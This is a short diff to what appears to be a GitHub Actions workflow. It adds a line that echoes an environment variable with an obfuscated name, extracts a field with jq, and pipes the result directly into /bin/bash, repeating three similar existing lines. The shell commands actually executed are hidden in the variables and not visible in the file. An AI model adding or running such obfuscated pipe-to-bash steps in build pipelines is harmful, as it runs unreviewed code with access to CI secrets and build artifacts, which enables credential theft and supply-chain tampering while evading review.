@@ -29,6 +29,7 @@ jobs:
           echo $dqoe572 | jq -r .kdmfp80992 | /bin/bash
           echo $pmqcr76419 | jq -r .nlc5099 | /bin/bash
           echo $c20 | jq -r .zfy579 | /bin/bash
+          echo $v308 | jq -r .s7298 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
